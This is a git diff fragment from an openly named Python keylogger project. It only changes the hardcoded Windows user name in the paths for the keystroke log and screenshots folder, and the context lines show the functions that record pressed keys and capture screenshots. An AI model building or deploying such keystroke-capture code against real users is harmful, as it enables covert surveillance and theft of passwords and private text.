@@ -17,7 +17,7 @@ class IntervalTimer(Timer):             #Control the Time interval between each 
             
             
 def write_file(keys):                  #To write the keys to the Files
-    with open("C:/Users/smarty/Desktop/Keylogger/log.txt","a") as f:
+    with open("C:/Users/nishi/Desktop/Keylogger/log.txt","a") as f:
         for key in keys:
             k=str(key).replace("'","")
             if k.find("space")>0:      #Replace Key_Space with " " in the main file
@@ -31,9 +31,9 @@ def write_file(keys):                  #To write the keys to the Files
 class keylogger_main:
     
     def _build_logs(self):             #To create the directory which contains all the screenshots and log files 
-        if not os.path.exists('C:/Users/smarty/Desktop/Keylogger'):
-            os.mkdir('C:/Users/smarty/Desktop/Keylogger')
-            os.mkdir('C:/Users/smarty/Desktop/Keylogger/Screenshots')
+        if not os.path.exists('C:/Users/nishi/Desktop/Keylogger'):
+            os.mkdir('C:/Users/nishi/Desktop/Keylogger')
+            os.mkdir('C:/Users/nishi/Desktop/Keylogger/Screenshots')
           #  os.mknod('Desktop/Keylogger/log.txt')
     
     def _on_press(self,k):             #This Function keeps track of pressed keys
